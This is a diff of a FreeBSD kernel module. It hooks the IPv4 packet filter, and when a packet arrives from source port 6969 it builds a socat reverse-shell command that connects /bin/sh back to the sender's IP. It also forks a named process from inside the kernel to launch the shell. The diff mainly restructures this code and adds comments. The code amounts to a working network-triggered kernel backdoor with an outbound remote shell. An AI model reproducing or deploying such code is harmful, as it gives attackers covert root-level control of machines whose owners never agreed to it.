@@ -284,48 +284,43 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
     printf("Kernel IP Address: %s\n", attacker_ip_str);
 
     // create the reverse shell command
-    snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd), "/usr/local/bin/socat TCP:%s:%d EXEC:/bin/sh", attacker_ip_str, LISTEN_PORT);
+    snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd), "/usr/local/bin/socat -d -d TCP:%s:%d EXEC:/bin/sh", attacker_ip_str, LISTEN_PORT);
 
-    printf("%s\n", reverse_shell_cmd);
-    //printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
+    // step through sys_fork()
+    struct proc *parent_proc;
+    struct thread *parent_td;
+    struct fork_req fr;
+    struct proc *new_proc;
+    int error, new_pid;
 
+    // Find the process "apeshit"
+    parent_proc = find_process_by_name(TARGET_PROC);
+    if (parent_proc == NULL) {
+        printf("[LKM] No running process named '%s' found.\n", TARGET_PROC);
+        return PFIL_PASS;
+    }
 
+    // Get the first thread of that process
+    parent_td = FIRST_THREAD_IN_PROC(parent_proc);
 
-        // step through sys_fork()
-        struct proc *parent_proc;
-        struct thread *parent_td;
-        struct fork_req fr;
-        struct proc *new_proc;
-        int error, new_pid;
+    bzero(&fr, sizeof(fr));
+    fr.fr_flags = RFPROC;
+    fr.fr_pidp = &new_pid;
+    fr.fr_procp = &new_proc;
 
-        // Find the process "apeshit"
-        parent_proc = find_process_by_name(TARGET_PROC);
-        if (parent_proc == NULL) {
-            printf("[LKM] No running process named '%s' found.\n", TARGET_PROC);
-            return PFIL_PASS;
-        }
-        // Get the first thread of that process
-        parent_td = FIRST_THREAD_IN_PROC(parent_proc);
-
-        bzero(&fr, sizeof(fr));
-        fr.fr_flags = RFPROC;
-        fr.fr_pidp = &new_pid;
-        fr.fr_procp = &new_proc;
-
-        // Fork from the found process
-        error = fork1(parent_td, &fr);
-        if (error) {
-            printf("[LKM] Fork failed: %d\n", error);
-            return PFIL_PASS;
-        }
-
+    // Fork from the found process
+    error = fork1(parent_td, &fr);
+    if (error) {
+        printf("[LKM] Fork failed: %d\n", error);
+        return PFIL_PASS;
+    }
 
     printf("Packet with source port 6969 detected!!\n");
     return PFIL_PASS;
 
 }
 
-
+// get the IPv4 head to add our hook to
 static int get_pfil_head(void) {
     // Retrieve the existing IPv4 filtering head
     g_ph = V_inet_pfil_head;
@@ -336,11 +331,9 @@ static int get_pfil_head(void) {
     }
 
     return (0);
-
 }
 
-
-// Load function: Attach our packet filter
+// Load function to make the hook known to the kernel
 static int load_hook(void) {
 
     struct pfil_hook_args ha = {
@@ -367,6 +360,7 @@ static int load_hook(void) {
     return 0;
 }
 
+// attach the hook to the head
 static int load_link(void) {
 
     struct pfil_link_args la = {
@@ -385,6 +379,7 @@ static int load_link(void) {
     return 0;
 }
 
+// unload the hook upon module unloading
 static void unload(void) {
     if (g_hook) {
         pfil_remove_hook(g_hook);
@@ -394,7 +389,7 @@ static void unload(void) {
     unload_custom_fork_event_handler();
 }
 
-
+// delcare LKM functionality
 static int event_handler(struct module *module, int event, void *arg) {
     switch (event) {
         case MOD_LOAD:
@@ -404,7 +399,6 @@ static int event_handler(struct module *module, int event, void *arg) {
             // load_head();
             // should test is we actually got each one before continueing 
             get_pfil_head();
-            // load shit
             load_hook();
             load_link();
             load_custom_fork_event_handler();
